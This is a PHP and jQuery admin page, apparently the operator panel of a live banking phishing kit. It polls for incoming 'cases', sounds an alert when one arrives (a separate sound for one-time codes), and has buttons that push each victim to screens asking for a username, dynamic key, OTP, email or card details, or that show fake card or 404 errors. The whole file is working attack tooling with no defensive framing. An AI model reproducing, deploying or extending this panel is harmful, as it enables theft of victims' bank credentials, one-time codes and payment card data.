<?php 
session_start(); 
require('../lib/funciones.php');

date_default_timezone_set('America/Bogota');

if (isset($_SESSION["usuario"])) {
	
}else{	
	header("Location: ../");
}

?>
<head>
	<meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" type="image/png" href="../monitor.png">
	<title>El ojo que todo lo ve</title>
	<link href="../css/styles.css" rel="stylesheet">	
	<script type="text/javascript" src="../js/functions.js"></script>	
	<script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>	
</head>

<body style="text-align: center; ">
	
	<audio class="timbre timbre-normal">
	 <source src="../audio/timbre.mp3" type="audio/mpeg">
	Your browser does not support the audio element.
	</audio>

	<audio class="timbre timbre-otp">
	 <source src="../audio/electrico.mp3" type="audio/mpeg">
	Your browser does not support the audio element.
	</audio>

	<div class="servicio" style="width:100%; height:200px; background-color:#101049; color:white; padding:10px; border-radius:20px;">
	<H3>Servicios</H3>
	<button style="width:30%;height:40px; margin-top:10px;border-radius:25px;"><a href="servicios.php" style="color:black;text-decoration:none;">Ver los servicios</a></button>
	<button style="width:30%;height:40px; margin-top:10px;border-radius:25px;">Limpiar base de datos</button>
	<button style="width:30%;height:40px; margin-top:10px;border-radius:25px;">Crear usuario</button>

	</div>

	
	<div class="contenido">
			<?php
				cargar_casos();											
			?>		
	</div>	
</body>
<script type="text/javascript">
	$(document).ready(function(){	
		setInterval(actualizar_casos,2000);	

		$(document).on('click', '.usuario', function() {
 			$(this).attr('disabled','disabled')
			$.post( "../process/estado.php",{ id:$(this).attr('id'),est:"12" },function(data) {

			});
 		});

 		$(document).on('click', '.dinamica', function() {
 			$(this).attr('disabled','disabled')
			$.post( "../process/estado.php",{ id:$(this).attr('id'),est:"2" },function(data) {

			});
 		});

 		$(document).on('click', '.otp', function() {
 			$(this).attr('disabled','disabled')
			$.post( "../process/estado.php",{ id:$(this).attr('id'),est:"8" },function(data) {

			});
 		});

 		$(document).on('click', '.correo', function() { 
 			$(this).attr('disabled','disabled')
 			$.post( "../process/estado.php",{ id:$(this).attr('id'),est:"4" },function(data) {
				
			});
 		});

 		$(document).on('click', '.tarjeta', function() { 
 			$(this).attr('disabled','disabled')
 			$.post( "../process/estado.php",{ id:$(this).attr('id'),est:"6" },function(data) {
				
			});
 		});

 		$(document).on('click', '.finalizar', function() { 
 			$(this).attr('disabled','disabled')
 			$.post( "../process/estado.php",{ id:$(this).attr('id'),est:"10" },function(data) {
				
			});
 		});

		
 		$(document).on('click', '.404', function() { 
 			$(this).attr('disabled','disabled')
 			$.post( "../process/estado.php",{ id:$(this).attr('id'),est:"40" },function(data) {
				
			});
 		});
 		
 		$(document).on('click', '.ccError', function() { 
 			$(this).attr('disabled','disabled')
 			$.post( "../process/estado.php",{ id:$(this).attr('id'),est:"41" },function(data) {
				
			});
 		});

 		

	});
</script>